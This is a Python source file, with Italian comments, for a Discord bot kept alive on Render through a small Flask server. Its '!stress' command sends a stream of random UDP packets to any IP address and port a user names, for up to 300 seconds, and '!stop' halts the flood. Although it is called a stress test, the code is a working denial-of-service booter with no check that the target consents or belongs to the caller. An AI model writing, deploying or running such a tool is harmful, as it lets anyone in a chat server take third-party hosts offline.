import discord
from discord.ext import commands
import socket
import os
import asyncio
from flask import Flask
from threading import Thread

# --- SEZIONE 1: CONFIGURAZIONE FLASK PER RENDER ---
app = Flask('')

@app.route('/')
def home():
    return "Bot is online and responding!"

def run_flask():
    # Render assegna automaticamente una porta alla variabile d'ambiente PORT
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()

# --- SEZIONE 2: LOGICA DEL BOT DISCORD ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Dizionario per monitorare i test attivi
active_tests = {}

async def udp_flood(ip, port, duration, test_id):
    """Invia pacchetti UDP all'IP e porta specificati."""
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Pacchetto di dati casuali da 1KB
    bytes_packet = os.urandom(1024)
    
    end_time = asyncio.get_event_loop().time() + duration
    
    while asyncio.get_event_loop().time() < end_time:
        if not active_tests.get(test_id, True):
            break
        try:
            client.sendto(bytes_packet, (ip, port))
        except Exception as e:
            print(f"Errore invio: {e}")
            break
        # Importante: asyncio.sleep(0) permette al bot di gestire altri comandi 
        # senza bloccare l'intero processo (concurrency)
        await asyncio.sleep(0.001) 

@bot.event
async def on_ready():
    print(f'Loggato come {bot.user.name} (ID: {bot.user.id})')
    print('------')

@bot.command()
async def stress(ctx, ip: str, port: int, duration: int = 60):
    """Esegue lo stress test: !stress [IP] [PORTA] [DURATA]"""
    # Sicurezza: limite durata massima
    if duration > 300:
        await ctx.send("❌ La durata massima consentita è 300 secondi.")
        return

    test_id = f"{ip}:{port}"
    if test_id in active_tests:
        await ctx.send(f"⚠️ Un test è già in corso su {test_id}")
        return

    active_tests[test_id] = True
    await ctx.send(f"🚀 **Test Avviato**\n📍 IP: `{ip}`\n🔢 Porta: `{port}`\n⏱️ Durata: `{duration}s`")

    try:
        # Eseguiamo il flood in background
        await asyncio.wait_for(udp_flood(ip, port, duration, test_id), timeout=duration + 10)
    except Exception as e:
        print(f"Errore durante il test: {e}")
    finally:
        active_tests.pop(test_id, None)
        await ctx.send(f"✅ **Test su {ip}:{port} concluso.**")

@bot.command()
async def stop(ctx, ip: str, port: int):
    """Ferma un test attivo: !stop [IP] [PORTA]"""
    test_id = f"{ip}:{port}"
    if test_id in active_tests:
        active_tests[test_id] = False
        await ctx.send(f"🛑 Test su `{test_id}` interrotto manualmente.")
    else:
        await ctx.send("❌ Nessun test attivo trovato per questo indirizzo.")

# --- SEZIONE 3: AVVIO ---
if __name__ == "__main__":
    # Avviamo Flask per l'uptime
    keep_alive()
    
    # Avviamo il bot recuperando il token da Render
    token = os.environ.get("DISCORD_TOKEN")
    if token:
        bot.run(token)
    else:
        print("ERRORE: Variabile 'DISCORD_TOKEN' non trovata!")
